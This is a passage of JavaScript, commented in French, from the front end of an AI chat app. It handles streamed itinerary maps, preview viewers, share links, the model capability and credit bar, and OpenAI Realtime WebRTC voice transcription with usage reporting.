            buffer += decoder.decode(value, { stream: true });
            const lines = buffer.split('\n');
            buffer = lines.pop();

            for (const line of lines) {
                if (!line.startsWith('data: ')) {
                    if (looksLikeAuthFailure(line)) {
                        try { reader.cancel(); } catch (_) {}
                        showSessionExpiredModal();
                        return;
                    }
                    continue;
                }
                let json;
                try { json = JSON.parse(line.slice(6)); }
                catch (_p) {
                    if (looksLikeAuthFailure(line)) {
                        try { reader.cancel(); } catch (_) {}
                        showSessionExpiredModal();
                        return;
                    }
                    continue;
                }
                if (json.error === 'session_expired' || json.authenticated === false) {
                    try { reader.cancel(); } catch (_) {}
                    showSessionExpiredModal(json.login_url || LOGIN_PATH);
                    return;
                }

                if (json.chunk) {
                    // Progression lisible : nombre d'étapes déjà rédigées par le LLM
                    rawSpec += json.chunk;
                    const steps = (rawSpec.match(/"name"/g) || []).length;
                    setMapLoadingText(steps > 0
                        ? tn(steps, 'Construction du trajet… {n} étape rédigée', 'Construction du trajet… {n} étapes rédigées')
                        : t('Construction du trajet…'));
                }

                if (json.map_progress && json.map_progress.phase === 'geocoding') {
                    setMapLoadingText(t('Localisation des étapes sur la carte…'));
                }

                if (json.llm_error) {
                    gotError = true;
                    renderInlineError(assistantEl, json.llm_error);
                }

                if (json.done) {
                    applyQuotaStatus(json.quota_status || null);
                    applyConversationCreditsTotal(json.conversation_credits_total || 0);
                    if (json.map_error || gotError || !json.map) {
                        closeMapViewer();
                        break;
                    }

                    // Bulle chat → carte compacte « Ouvrir la carte »
                    const body = assistantEl.closest('.msg-body') || assistantEl.parentElement;
                    if (body) {
                        const mdSpan = assistantEl.querySelector('.md-render');
                        if (mdSpan) mdSpan.innerHTML = '';
                        assistantEl.classList.remove('streaming');
                        assistantEl.insertAdjacentHTML('beforebegin', buildMapCard(json.msg_id, json.map));
                    }
                    scrollBottom();

                    // Rendu de la carte dans le volet droit
                    openMapViewer(json.map, json.msg_id || null, false);
                }
            }
        }
    } catch (err) {
        closeMapViewer();
        renderInlineError(assistantEl, {
            kind: 'generic',
            title: t('Génération impossible'),
            message: err && err.message ? err.message : t('L\'itinéraire n\'a pas pu être généré. Réessayez.'),
        });
    }

    sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
}

function bindViewerControls() {
    if (viewersControlsBound) return;
    viewersControlsBound = true;

    document.getElementById('htmlViewerClose')?.addEventListener('click', closeHtmlViewer);

    // ----- Viewer carte / itinéraire -----
    document.getElementById('mapViewerClose')?.addEventListener('click', closeMapViewer);
    document.getElementById('mapViewerPdf')?.addEventListener('click', exportMapPdf);
    document.getElementById('mapViewerGmaps')?.addEventListener('click', openMapInGoogleMaps);
    document.getElementById('mapViewerNotesToggle')?.addEventListener('click', function () {
        const notes = document.getElementById('mapNotes');
        if (!notes) return;
        notes.classList.toggle('collapsed');
        this.classList.toggle('edit-active', !notes.classList.contains('collapsed'));
        // La carte récupère la place libérée
        setTimeout(() => leafletMap && leafletMap.invalidateSize(), 60);
    });

    document.getElementById('htmlTabCode')?.addEventListener('click', function () {
        showHtmlViewerCode(currentHtmlContent);
    });

    document.getElementById('htmlTabPreview')?.addEventListener('click', function () {
        if (currentHtmlContent) switchToHtmlPreview(currentHtmlContent);
    });

    document.getElementById('htmlViewerDownload')?.addEventListener('click', async function () {
        // Télécharge la version autonome : images générées ré-embarquées en data-URI côté serveur.
        if (currentHtmlMsgId) {
            try {
                const res  = await fetch(`/chat/message/${currentHtmlMsgId}/html?inline=1`, { headers: { 'X-CSRF-Token': csrfToken } });
                const data = await res.json().catch(() => ({}));
                if (data && data.html) { downloadHtml(data.html, 'page.html'); return; }
            } catch (_) { /* repli sur le contenu en mémoire */ }
        }
        if (currentHtmlContent) downloadHtml(currentHtmlContent, 'page.html');
    });

    document.getElementById('htmlViewerNewTab')?.addEventListener('click', function () {
        if (!currentHtmlContent) return;
        openHtmlInExternalWindow(currentHtmlContent);
    });

    document.getElementById('htmlViewerRefresh')?.addEventListener('click', refreshHtmlPreview);
    document.getElementById('htmlDeviceDesktop')?.addEventListener('click', function () { setPreviewDevice('desktop'); });
    document.getElementById('htmlDeviceMobile')?.addEventListener('click', function () { setPreviewDevice('mobile'); });
    initHtmlViewerResize();

    // ----- Mode édition de l'aperçu HTML -----
    document.getElementById('htmlViewerEdit')?.addEventListener('click', function () {
        setHtmlEditMode(!htmlEditMode);
    });

    // Messages de l'éditeur injecté dans l'iframe (origine opaque → on filtre par source).
    window.addEventListener('message', function (e) {
        const frame = document.getElementById('htmlViewerFrame');
        if (!frame || e.source !== frame.contentWindow) return;
        const d = e.data || {};
        if (d.type === 'mia-html-changed' && typeof d.html === 'string') {
            saveEditedHtml(d.html);
        } else if (d.type === 'mia-request-image') {
            openHtmlImagePicker(d.mode);
        } else if (d.type === 'mia-editor-ready' && htmlEditMode) {
            // Rechargement de l'aperçu (Rafraîchir) pendant l'édition → resynchronise l'état.
            postToHtmlPreview({ type: 'mia-edit-mode', on: true });
        }
    });

    document.getElementById('htmlImagePickerFile')?.addEventListener('change', function () {
        const file = this.files && this.files[0];
        this.value = '';
        if (file) uploadHtmlPickedImage(file);
    });
    document.getElementById('htmlImagePickerInsert')?.addEventListener('click', function () {
        const url = (document.getElementById('htmlImagePickerUrl')?.value || '').trim();
        if (!url) return;
        if (!/^https?:\/\//i.test(url)) {
            showToast(t('URL d\'image invalide (http(s) attendu).'), 'error');
            return;
        }
        sendImageToHtmlPreview(url);
    });
    document.getElementById('htmlImagePickerUrl')?.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            document.getElementById('htmlImagePickerInsert')?.click();
        }
    });
    document.getElementById('htmlImagePickerCancel')?.addEventListener('click', closeHtmlImagePicker);

    document.getElementById('videoViewerClose')?.addEventListener('click', closeVideoViewer);

    document.getElementById('videoViewerDownload')?.addEventListener('click', function () {
        if (!currentVideoUrl) return;
        downloadVideoFromUrl(currentVideoUrl, currentVideoFilename || 'video.mp4');
    });

    document.getElementById('videoViewerNewTab')?.addEventListener('click', function () {
        if (!currentVideoUrl) return;
        window.open(currentVideoUrl, '_blank', 'noopener,noreferrer');
    });

    document.getElementById('sourcesViewerClose')?.addEventListener('click', closeSourcesViewer);

    document.getElementById('sourcesViewerOpen')?.addEventListener('click', function () {
        if (!currentSourceSelectedUrl) return;
        window.open(currentSourceSelectedUrl, '_blank', 'noopener,noreferrer');
    });

    document.getElementById('sourcesViewerCopy')?.addEventListener('click', async function () {
        if (!currentSourceItems.length) return;
        const payload = currentSourceItems.map((item) => `[${item.index}] ${item.url}`).join('\n');
        try {
            await navigator.clipboard.writeText(payload);
            showToast(t('Sources copiées dans le presse-papiers.'), 'info');
        } catch (err) {
            showToast(t('Impossible de copier les sources.'), 'error');
        }
    });

    document.getElementById('sourcesViewerList')?.addEventListener('click', function (e) {
        const item = e.target.closest('.sources-viewer-item');
        if (!item) return;
        const idx = Number(item.dataset.index || 0);
        if (!idx) return;
        setSourcesViewerSelection(idx);
    });

    // Évite toute ouverture résiduelle (BFCache/navigation) au chargement.
    closeHtmlViewer();
    closeVideoViewer();
    closeSourcesViewer();
    closeMapViewer();
    closeDeckViewer();
}

// Délégation pour les cartes HTML, vidéo et itinéraire dans le fil de messages
// =========================================================
// PARTAGE D'UNE CRÉATION PAR LIEN UNIQUE (/share/{token})
// =========================================================
// Le lien n'est visible que par les utilisateurs CONNECTÉS à l'app. Premier
// clic → création du lien + copie presse-papier ; bouton « Partagé » → petit
// menu Copier / Régénérer / Révoquer.

async function shareCreationRequest(msgId, regenerate) {
    const body = new FormData();
    if (regenerate) body.append('regenerate', '1');
    const res = await fetch(`/chat/message/${msgId}/share`, {
        method: 'POST',
        headers: { 'X-CSRF-Token': csrfToken, 'Accept': 'application/json' },
        body,
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
}

async function unshareCreationRequest(msgId) {
    const res = await fetch(`/chat/message/${msgId}/unshare`, {
        method: 'POST',
        headers: { 'X-CSRF-Token': csrfToken, 'Accept': 'application/json' },
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
}

// Synchronise tous les boutons Partager du message (carte + actions image-only).
function setShareButtonsState(msgId, token) {
    document.querySelectorAll(`.btn-share-creation[data-msg-id="${msgId}"]`).forEach((btn) => {
        btn.dataset.shareToken = token || '';
        btn.classList.toggle('shared', !!token);
        const svg = btn.querySelector('svg');
        btn.innerHTML = (svg ? svg.outerHTML : SHARE_CREATION_SVG) + (token ? t('Partagé') : t('Partager'));
    });
}

async function copyShareLink(token) {
    const url = `${location.origin}/share/${token}`;
    try {
        await navigator.clipboard.writeText(url);
        showToast(t('Lien copié — visible uniquement par les utilisateurs connectés.'), 'success');
    } catch (_err) {
        showToast(t('Copie impossible. Lien : {url}', { url: url }), 'error');
    }
}

function closeSharePopover() {
    document.getElementById('sharePopover')?.remove();
}

// Menu flottant du bouton « Partagé » : Copier / Régénérer / Révoquer.
function openSharePopover(btn) {
    closeSharePopover();
    const msgId = btn.dataset.msgId;
    const token = btn.dataset.shareToken || '';
    if (!msgId || !token) return;

    const pop = document.createElement('div');
    pop.id = 'sharePopover';
    pop.className = 'share-popover';
    pop.innerHTML = `
        <button type="button" data-share-action="copy">Copier le lien</button>
        <button type="button" data-share-action="regenerate">Régénérer le lien</button>
        <button type="button" data-share-action="revoke" class="danger">Révoquer le lien</button>`;
    document.body.appendChild(pop);

    // Pixels d'écran → pixels de page (taille d'affichage, cf. head-meta.php).
    const z = window.miaUiZoom ? window.miaUiZoom() : 1;
    const rect = btn.getBoundingClientRect();
    pop.style.left = `${Math.max(8, Math.min(rect.left, window.innerWidth - pop.offsetWidth * z - 8)) / z}px`;
    pop.style.top  = `${(rect.bottom + 6) / z}px`;

    pop.addEventListener('click', async (ev) => {
        const action = ev.target.closest('[data-share-action]')?.dataset.shareAction;
        if (!action) return;
        closeSharePopover();
        try {
            if (action === 'copy') {
                await copyShareLink(token);
            } else if (action === 'regenerate') {
                const data = await shareCreationRequest(msgId, true);
                if (data && data.token) {
                    setShareButtonsState(msgId, data.token);
                    await copyShareLink(data.token);
                    showToast(t('Nouveau lien généré — l\'ancien est désactivé.'), 'success');
                }
            } else if (action === 'revoke') {
                await unshareCreationRequest(msgId);
                setShareButtonsState(msgId, '');
                showToast(t('Lien révoqué : il n\'est plus accessible.'), 'info');
            }
        } catch (_err) {
            showToast(t('Action de partage impossible. Réessayez.'), 'error');
        }
    });

    // Fermeture au clic hors du menu (différée : le clic courant ne doit pas fermer).
    setTimeout(() => {
        document.addEventListener('click', function onDocClick(ev) {
            if (!ev.target.closest('#sharePopover')) {
                closeSharePopover();
                document.removeEventListener('click', onDocClick);
            }
        });
    }, 0);
}

async function handleShareCreationClick(btn) {
    const msgId = btn.dataset.msgId;
    if (!msgId) return;

    if (btn.dataset.shareToken) {
        openSharePopover(btn);
        return;
    }

    try {
        const data = await shareCreationRequest(msgId, false);
        if (data && data.token) {
            setShareButtonsState(msgId, data.token);
            await copyShareLink(data.token);
        } else {
            showToast(data?.error || t('Partage impossible.'), 'error');
        }
    } catch (_err) {
        showToast(t('Partage impossible. Réessayez.'), 'error');
    }
}

async function handleRichCardClick(e) {
    const shareCreationBtn = e.target.closest('.btn-share-creation');
    if (shareCreationBtn) {
        await handleShareCreationClick(shareCreationBtn);
        return;
    }
    const openBtn     = e.target.closest('.btn-open-html-viewer');
    const downloadBtn = e.target.closest('.btn-download-html');
    const externalBtn = e.target.closest('.btn-open-html-external');
    const openVideoBtn = e.target.closest('.btn-open-video-viewer');
    const downloadVideoBtn = e.target.closest('.btn-download-video');
    const openMapBtn  = e.target.closest('.btn-open-map-viewer');
    if (!openBtn && !downloadBtn && !externalBtn && !openVideoBtn && !downloadVideoBtn && !openMapBtn) return;

    // ----- Carte / itinéraire -----
    if (openMapBtn) {
        const msgId = openMapBtn.dataset.msgId;
        if (msgId && currentMapMsgId == msgId && currentMapSpec) {
            openMapViewer(currentMapSpec, msgId, false);
            return;
        }
        openMapViewer(null, null, true);
        setMapLoadingText(t('Chargement de l\'itinéraire…'));
        try {
            const res  = await fetch(`/chat/message/${msgId}/map`, { headers: { 'X-CSRF-Token': csrfToken } });
            const data = await res.json();
            if (data && data.map) {
                openMapViewer(data.map, msgId || null, false);
            } else {
                closeMapViewer();
            }
        } catch (err) {
            closeMapViewer();
        }
        return;
    }

    // ----- HTML -----
    if (openBtn || downloadBtn || externalBtn) {
        const trigger = openBtn || downloadBtn || externalBtn;
        const msgId = trigger.dataset.msgId;
        let html = (msgId && currentHtmlMsgId == msgId) ? currentHtmlContent : null;

        if (!html && msgId) {
            if (openBtn) openHtmlViewer(null, null, true);
            try {
                const res  = await fetch(`/chat/message/${msgId}/html`, { headers: { 'X-CSRF-Token': csrfToken } });
                const data = await res.json();
                html = data.html || '';
                if (html) {
                    currentHtmlContent = html;
                    currentHtmlMsgId   = msgId;
                }
            } catch (err) {
                if (openBtn) closeHtmlViewer();
                return;
            }
        }

        if (openBtn && html) openHtmlViewer(html, msgId || null, false);
        if (downloadBtn && html) {
            downloadHtml(html, (downloadBtn.dataset.filename || 'page.html'));
        }
        if (externalBtn && html) {
            openHtmlInExternalWindow(html);
        }
        return;
    }

    // ----- Vidéo -----
    if (openVideoBtn || downloadVideoBtn) {
        const trigger = openVideoBtn || downloadVideoBtn;
        const msgId = trigger.dataset.msgId;
        let videoUrl = trigger.dataset.videoUrl || '';
        let videoFilename = trigger.dataset.filename || 'video.mp4';

        if (!videoUrl && msgId && currentVideoMsgId == msgId) {
            videoUrl = currentVideoUrl;
        }

        if (!videoUrl && msgId) {
            if (openVideoBtn) openVideoViewer(null, null, true, null);
            try {
                const res  = await fetch(`/chat/message/${msgId}/video`, { headers: { 'X-CSRF-Token': csrfToken } });
                const data = await res.json();
                videoUrl = data.video_url || '';
                videoFilename = data.filename || videoFilename;
            } catch (err) {
                if (openVideoBtn) closeVideoViewer();
                return;
            }
        }

        if (!videoUrl) {
            if (openVideoBtn) closeVideoViewer();
            return;
        }

        if (openVideoBtn) {
            openVideoViewer(videoUrl, msgId || null, false, null, videoFilename);
        }
        if (downloadVideoBtn) {
            downloadVideoFromUrl(videoUrl, videoFilename || 'video.mp4');
        }
    }
}

function handleCitationLinkClick(e) {
    const citationLink = e.target.closest('a.citation-link');
    if (!citationLink) return;
    if (!isSonarProConversation()) return;

    const messageEl = citationLink.closest('.message');
    if (!messageEl) return;

    const preferredIndex = Number(citationLink.dataset.citationIndex || 0) || null;
    if (!openSourcesViewerForMessage(messageEl, preferredIndex)) return;

    e.preventDefault();
    e.stopPropagation();
}

function bindRichCardsDelegation() {
    if (richCardsDelegationBound) return;
    richCardsDelegationBound = true;
    const chatMessagesEl = document.getElementById('chatMessages');
    chatMessagesEl?.addEventListener('click', handleRichCardClick);
    chatMessagesEl?.addEventListener('click', handleCitationLinkClick);
}

function initRichAttachmentsUi() {
    bindViewerControls();
    bindRichCardsDelegation();
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initRichAttachmentsUi, { once: true });
} else {
    initRichAttachmentsUi();
}

// ---- Barre de capacités LLM ----
function buildCapsHtml(llmKey) {
    const info = window.LLM_INFO?.[llmKey];
    if (!info) return '';

    const tags     = info.tags || [];
    const canWeb   = info.web_native || tags.includes('web');
    const canImg   = tags.includes('vision');
    const canFile  = tags.includes('fichiers');
    const canTools = !!info.tool_use;

    const cap = (ok, label, hint) =>
        `<span class="llm-cap ${ok ? 'llm-cap-ok' : 'llm-cap-no'}" title="${hint}">${ok ? '✓' : '✗'} ${label}</span>`;

    // Coût en clair : ≈ crédits d'une réponse (et d'une recherche Internet),
    // estimés par le serveur avec les tarifs de la facturation (CreditEstimate).
    const credits = Number(info.credits || 0);
    // Recherche annoncée seulement là où le bandeau dit « Internet » : ailleurs
    // la ligne se contredirait.
    const search  = canWeb ? Number(info.search_credits || 0) : 0;
    const cost = credits > 0
        ? `<span class="llm-cap llm-cap-cost" title="${escAttr(t('Estimé avec les tarifs appliqués à vos crédits, sur les réponses récentes de ce modèle. Une conversation longue, des fichiers ou des connecteurs coûtent davantage.'))}">${escHtml(t('≈ {n} crédits par réponse', { n: formatInt(credits) }))}${search > 0 ? ' · ' + escHtml(t('≈ {n} par recherche Internet', { n: formatInt(search) })) : ''}</span>`
        : '';

    return cap(canWeb,  'Internet', t('Permet au modele de faire des recherches web en ligne.'))
         + cap(canImg,  'Images', t('Permet au modele de lire et analyser des images.'))
         + cap(canFile, 'Fichiers', t('Permet au modele de traiter des fichiers joints.'))
         + cap(canTools, t('Connecteurs'), t('Permet au modele de piloter les connecteurs du menu + (Google Drive, Gmail, Agenda).'))
         + cost;
}

function updateLlmInfoBar(llmKey) {
    const html = buildCapsHtml(llmKey);
    const bar  = document.getElementById('llmInfoBar');
    const caps = document.getElementById('llmCapsBar');
    if (bar)  bar.innerHTML  = html;
    if (caps) caps.innerHTML = html;
    // Les connecteurs du menu « + » suivent la capacité du modèle courant
    window.syncConnectorCompat?.();
    // « Version soignée » des cartes de présentation et de classeur aussi.
    window.MiaFiles?.refreshNative?.();
}

// Garantit l'initialisation de l'info LLM même sans picker interactif.
updateLlmInfoBar(llmSelect?.value);
updateTopToolbarMeta();
applyQuotaStatus(window.CREDIT_QUOTA_STATUS || null);
applyConversationCreditsTotal(window.CONVERSATION_CREDITS_TOTAL || 0);

// ---- Fermeture modale quota ----
document.getElementById('quotaModalClose')?.addEventListener('click', () => {
    document.getElementById('quotaModal').style.display = 'none';
});

/* =========================================================
   Socle Realtime — OpenAI Realtime GA (WebRTC + transcription)
   Partagé par la DICTÉE (texte dans le champ) et la CONVERSATION
   vocale (tours envoyés, réponse lue) : une seule plomberie —
   jeton éphémère, micro, WebRTC, reconnexion, facturation.
   ========================================================= */
function createRealtimeTranscriber(opts) {
    const purpose = opts.purpose === 'conversation' ? 'conversation' : 'dictation';

    let pc = null;            // RTCPeerConnection
    let dc = null;            // RTCDataChannel "oai-events"
    let mediaStream = null;
    let sender = null;        // RTCRtpSender de la piste micro (détachable)
    let micTrack = null;
    let recording = false;    // session voulue par l'utilisateur
    let connecting = false;   // clic → session réellement active
    let wantMic = true;       // piste envoyée à OpenAI ; false = silence (rien d'écouté, rien de facturé)
    let micAttached = false;
    let micGen = 0;           // numéro de prise du micro : une acquisition périmée est relâchée
    let activeModel = '';

    function emitState() { opts.onState?.({ connecting, recording }); }
    function setLoading(on) { connecting = on; emitState(); }
    function fail(message, payload = null) {
        if (opts.onFatal) opts.onFatal(message, payload);
        // Cause présentée par le serveur (crédit épuisé, accès refusé…) :
        // même toast que le reste de l'application, jamais une alerte brute.
        else showLlmErrorToast(payload, message, t('Dictée impossible'));
    }

    // Chien de garde du silence. La panne qu'on corrige ici était INVISIBLE :
    // session ouverte, micro au rouge, aucune erreur, aucun texte. Tant qu'un
    // premier signal (parole détectée, transcription) n'est pas arrivé, on le
    // dit — seulement micro attaché : en conversation, MIA parle pendant que
    // le micro est détaché, et aucun texte n'est attendu.
    const SILENCE_MS = 9000;
    let silenceTimer = null;
    let gotSignal = false;

    function noteSignal() {
        gotSignal = true;
        clearTimeout(silenceTimer);
        silenceTimer = null;
    }

    function armSilenceWatchdog() {
        clearTimeout(silenceTimer);
        silenceTimer = setTimeout(() => {
            if (!recording || !micAttached || gotSignal) return;
            // Micro ouvert SANS attendre de parole (la conversation le garde
            // ouvert pendant que MIA lit, pour entendre un « stop ») : le
            // silence de l'utilisateur y est la règle, pas une panne.
            if (opts.expectsSpeech && !opts.expectsSpeech()) return;
            console.warn('[mic] aucun évènement de transcription après', SILENCE_MS, 'ms — modèle', activeModel);
            showToast(opts.silenceMessage || t('Dictée : aucun texte reçu. Vérifiez que le micro capte du son.'), 'error');
        }, SILENCE_MS);
    }

    // Facturation : l'audio part en WebRTC direct vers OpenAI, le serveur ne
    // voit jamais une seconde d'audio. C'est donc le navigateur qui rapporte
    // les secondes ÉCOUTÉES de chaque session à sa fermeture (arrêt, envoi du
    // message, reconnexion, fermeture de l'onglet) — en `sendBeacon`, qui
    // survit au déchargement de la page. Seules les périodes micro attaché
    // comptent : en conversation, le temps où MIA parle n'envoie rien à
    // OpenAI. Best-effort : un rapport perdu ne bloque rien, il manque juste
    // au grand livre.
    let listenStartedAt = 0;  // ms ; 0 = micro détaché
    let listenedMs = 0;       // segments clos de la session courante

    function openListenSegment() { if (!listenStartedAt) listenStartedAt = Date.now(); }
    function closeListenSegment() {
        if (listenStartedAt) {
            listenedMs += Date.now() - listenStartedAt;
            listenStartedAt = 0;
        }
    }
    function reportDictationUsage() {
        closeListenSegment();
        const seconds = Math.max(0, listenedMs / 1000);
        listenedMs = 0;
        if (seconds < 1) return;
        const fd = new FormData();
        fd.append('csrf_token', csrfToken);
        fd.append('seconds', seconds.toFixed(1));
        fd.append('model', activeModel);
        fd.append('conversation_id', convId() || '');
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/chat/realtime-transcription/usage', fd);
            } else {
                fetch('/chat/realtime-transcription/usage', { method: 'POST', body: fd, keepalive: true }).catch(() => {});
            }
        } catch (_) {}
    }
    window.addEventListener('pagehide', () => { if (recording) reportDictationUsage(); });

    // Micro attaché / relâché. Relâcher = `replaceTrack(null)` (plus un paquet
    // RTP : rien n'est transcrit ni facturé) ET arrêt de la capture. L'arrêt
    // n'est pas un détail : tant qu'une capture est ouverte, iOS garde la
    // session audio en mode « appel » — la voix de MIA sort par l'écouteur, à
    // volume réduit, et les boutons de volume n'y changent rien. Capture
    // fermée, la lecture repasse par le haut-parleur, au volume du média. La
    // session OpenAI reste ouverte (aucune reconnexion), le micro est repris
    // à l'écoute suivante — la permission a déjà été accordée sur la page.
    async function attachMic() {
        wantMic = true;
        if (!recording) return;
        const gen = ++micGen;
        if (!micTrack || micTrack.readyState !== 'live') {
            let stream;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            } catch (_) {
                if (gen !== micGen || !wantMic || !recording) return;
                fail(t('Accès au micro refusé.'));
                stopRecording();
                return;
            }
            if (gen !== micGen || !wantMic || !recording) {
                try { stream.getTracks().forEach(piste => piste.stop()); } catch (_) {}
                return;
            }
            mediaStream = stream;
            micTrack = stream.getAudioTracks()[0];
        }
        if (sender && micTrack) {
            try { await sender.replaceTrack(micTrack); } catch (_) {}
            if (gen !== micGen || !wantMic || !recording) return;
        }
        micAttached = true;
        openListenSegment();
        gotSignal = false;
        armSilenceWatchdog();
    }
    function releaseMic() {
        wantMic = false;
        micGen++;
        micAttached = false;
        closeListenSegment();
        clearTimeout(silenceTimer);
        silenceTimer = null;
        if (sender) sender.replaceTrack(null).catch(() => {});
        try { mediaStream?.getTracks().forEach(piste => piste.stop()); } catch (_) {}
        try { micTrack?.stop(); } catch (_) {}
        mediaStream = micTrack = null;
    }

    function teardown() {
        reportDictationUsage();
        clearTimeout(silenceTimer);
        silenceTimer = null;
        try { dc?.close(); } catch (_) {}
        try { pc?.getSenders().forEach(s => { try { s.track?.stop(); } catch (_) {} }); } catch (_) {}
        try { pc?.close(); } catch (_) {}
        try { mediaStream?.getTracks().forEach(piste => piste.stop()); } catch (_) {}
        try { micTrack?.stop(); } catch (_) {}
        dc = pc = mediaStream = sender = micTrack = null;
        micAttached = false;
    }

    // Reconnexion automatique si la session se ferme (timeout d'inactivité,
    // erreur réseau…) tant que l'utilisateur n'a pas explicitement arrêté.
    function reconnectLater(why) {
        console.warn('[mic]', why, '— reconnect');
        reportDictationUsage();
        try { pc?.close(); } catch (_) {}
        try { mediaStream?.getTracks().forEach(piste => piste.stop()); } catch (_) {}
        try { micTrack?.stop(); } catch (_) {}
        dc = pc = mediaStream = sender = micTrack = null;
        micAttached = false;
        setTimeout(() => { if (recording) startRecording(); }, 300);
    }

    // Erreurs qu'OpenAI émet sans que la session soit compromise : les
    // remonter en alerte couperait la dictée pour rien.
    const BENIGN_ERRORS = new Set([
        'input_audio_buffer_commit_empty',
        'response_cancel_not_active',
    ]);

    // Chaque évènement porte l'identifiant de SON tour de parole (`item_id`) :
    // la conversation s'en sert pour savoir QUAND une phrase a commencé —
    // pendant que MIA lisait, ou à l'écoute. La dictée l'ignore.
    function handleEvent(m) {
        const type = m.type || '';
        const itemId = m.item_id || '';
        if (type === 'input_audio_buffer.speech_started') {
            // Détection de tour serveur (conversation) : la parole est vue,
            // même si le texte n'arrive qu'à la fin du tour.
            noteSignal();
            opts.onSpeechStart?.(itemId);
        } else if (type === 'input_audio_buffer.speech_stopped') {
            opts.onSpeechStop?.(itemId);
        } else if (type.endsWith('input_audio_transcription.delta') || type === 'transcript.delta') {
            noteSignal();
            opts.onDelta?.(m.delta || m.transcript || '', itemId);
        } else if (type.endsWith('input_audio_transcription.completed') || type === 'transcript.completed') {
            noteSignal();
            opts.onCompleted?.(m.transcript || m.delta || '', itemId);
        } else if (type === 'error') {
            const e = m.error || {};
            console.error('[mic] OpenAI error', JSON.stringify(m, null, 2));
            if (BENIGN_ERRORS.has(e.code)) return;
            const payload = openAiSessionError(e.code || e.type, 0);
            fail(payload ? payload.message : t('OpenAI a interrompu la transcription. Réessayez dans un instant.'), payload);
            stopRecording();
        }
    }

    /** Ouvre (ou rouvre) la session. Rend true si elle est établie. */
    async function startRecording() {
        // Spinner immédiat au 1er démarrage (pas sur les reconnexions auto où
        // recording est déjà vrai) : signale que le micro se connecte.
        const isInitial = !recording;
        if (isInitial) setLoading(true);

        let token, model;
        try {
            const body = new FormData();
            body.append('purpose', purpose);
            const r = await fetchWithSessionGuard('/chat/realtime-transcription', {
                method: 'POST',
                headers: { 'X-CSRF-Token': csrfToken },
                body,
            });
            if (!r.ok) {
                const err = await r.json().catch(() => ({}));
                // Quota atteint : même fenêtre que pour un message, et le micro
                // s'arrête — y compris quand ce refus survient sur une
                // reconnexion automatique, en pleine dictée.
                if (handleQuotaExceededPayload(err)) {
                    stopRecording();
                    setLoading(false);
                    return false;
                }
                console.warn('[mic] session error', err);
                // Le serveur présente la cause (crédit épuisé chez OpenAI,
                // accès refusé…) : jamais le message brut du fournisseur.
                const refusal = new Error(err.error || t('Session refusée'));
                refusal.payload = err.llm_error || null;
                throw refusal;
            }
            const data = await r.json();
            token = data?.client_secret;
            model = data?.model || 'gpt-live-transcribe';
            activeModel = model;
            if (!token) throw new Error(t('Token éphémère manquant'));
        } catch (e) {
            setLoading(false);
            fail(e.message || t('Impossible de démarrer la dictée.'), e.payload || null);
            // Refus sur une reconnexion automatique (dictée coupée par
            // l'administrateur, session refusée…) : le micro ne reste pas au
            // rouge sur une session qui n'existe plus.
            if (recording) stopRecording();
            return false;
        }

        // Micro pris AVANT la connexion quand il est voulu (dictée, début
        // d'écoute) ; sur une reconnexion pendant que MIA parle (wantMic
        // faux), rien n'est capturé — attachMic le reprendra.
        if (wantMic) {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                micTrack = mediaStream.getAudioTracks()[0];
            } catch (_) {
                setLoading(false);
                fail(t('Accès au micro refusé.'));
                if (recording) stopRecording();
                return false;
            }
        }

        try {
            pc = new RTCPeerConnection();
            pc.addEventListener('connectionstatechange', () => {
                if (!pc) return;
                const st = pc.connectionState;
                if (recording && (st === 'failed' || st === 'disconnected' || st === 'closed')) {
                    reconnectLater('pc state ' + st);
                }
            });
            // Data channel pour recevoir les events de transcription
            dc = pc.createDataChannel('oai-events');
            dc.addEventListener('message', (ev) => {
                try { handleEvent(JSON.parse(ev.data)); } catch (_) {}
            });
            dc.addEventListener('close', () => {
                if (recording) reconnectLater('data channel closed during recording');
            });
            // Émetteur audio, avec ou sans piste : un transceiver `sendrecv`
            // vide accepte une piste plus tard par replaceTrack, sans
            // renégociation (cf. attachMic / releaseMic).
            const tx = pc.addTransceiver(micTrack || 'audio', {
                direction: 'sendrecv',
                streams: mediaStream ? [mediaStream] : [],
            });
            sender = tx.sender;
            // OpenAI peut aussi envoyer un transceiver audio retour — on l'ignore
            pc.addTransceiver('audio', { direction: 'recvonly' });

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);

            // GA WebRTC : POST SDP sur /v1/realtime/calls (et non /v1/realtime).
            // Le modèle vient déjà du token éphémère (session pré-configurée).
            const sdpRes = await fetch('https://api.openai.com/v1/realtime/calls', {
                method: 'POST',
                body: offer.sdp,
                headers: {
                    'Authorization': 'Bearer ' + token,
                    'Content-Type': 'application/sdp',
                },
            });
            if (!sdpRes.ok) {
                const txt = await sdpRes.text().catch(() => '');
                console.warn('[mic] SDP exchange ' + sdpRes.status + ' — ' + txt.slice(0, 200));
                let code = '';
                try { const j = JSON.parse(txt); code = (j && j.error && (j.error.code || j.error.type)) || ''; } catch (_e) { /* corps non JSON */ }
                const payload = openAiSessionError(code, sdpRes.status);
                const refusal = new Error(payload ? payload.message : t('Échec connexion WebRTC.'));
                refusal.payload = payload;
                throw refusal;
            }
            const answerSdp = await sdpRes.text();
            await pc.setRemoteDescription({ type: 'answer', sdp: answerSdp });
        } catch (e) {
            console.error('[mic] WebRTC setup failed', e);
            fail(e.message || t('Échec connexion WebRTC.'), e.payload || null);
            setLoading(false);
            recording = false;
            emitState();
            teardown();
            opts.onStopped?.();
            return false;
        }

        if (isInitial) {
            recording = true;
            setLoading(false);
            opts.onStarted?.();
        }
        // La session OpenAI facture à partir d'ici — si le micro est voulu.
        if (wantMic) attachMic();
        else releaseMic();
        return true;
    }

    function stopRecording() {
        setLoading(false);
        if (!recording) return;
        recording = false;
        emitState();
        teardown();
        opts.onStopped?.();
    }

    return {
        start: startRecording,
        stop: stopRecording,
        attachMic,
        releaseMic,
        isRecording: () => recording,
        isConnecting: () => connecting,
        model: () => activeModel,
    };
}

/* =========================================================
   Dictée vocale — la voix s'écrit dans le champ de saisie
   ========================================================= */
(() => {
